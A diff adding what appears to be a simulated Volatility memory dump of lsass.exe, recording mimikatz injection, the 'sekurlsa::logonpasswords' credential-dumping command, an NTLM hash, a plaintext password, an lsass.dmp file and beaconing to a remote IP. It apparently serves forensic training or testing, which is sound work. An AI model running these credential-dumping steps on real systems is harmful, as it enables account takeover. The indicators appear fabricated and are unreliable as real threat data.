@@ -1,0 +1,18 @@
+================================================================================
+VOLATILITY / PROCESS MEMORY STRINGS EXTRACTION DUMP
+Process: lsass.exe (PID: 672) | Target Host: WIN-SRV-CORP01
+Artifact Type: Process Injection & In-Memory Credential Access
+================================================================================
+
+[0x00007FFD8912A000] VirtualAllocEx RWX allocation detected from unknown caller
+[0x00007FFD8912B400] Injected Module: mimikatz.dll (SHA256: d41d8cd98f00b204e9800998ecf8427e02d0fd097eed0cf42e399587f7b3a4a1)
+[0x00007FFD89130020] Executing command: sekurlsa::logonpasswords
+[0x00007FFD89130100] Privilege 'SeDebugPrivilege' acquired successfully
+[0x00007FFD89132500] Authentication ID: (00000000,0x0001f42a)
+[0x00007FFD89132540] Package: NTLM
+[0x00007FFD89132580] User: Administrator | Domain: CORP-ENTERPRISE
+[0x00007FFD89132600] NTLM Hash: b4b9b02e6f09a9bd760f388b67351e2b
+[0x00007FFD89132640] Plaintext: Winter2026!Secure#Pass
+[0x00007FFD89135000] Remote Thread created in PID 672 by suspicious parent PID 4412 (cmd.exe)
+[0x00007FFD89140000] Procdump memory artifact: C:\Windows\Temp\lsass.dmp created
+[0x00007FFD89145000] Network beaconing to remote staging point 178.62.204.101:443
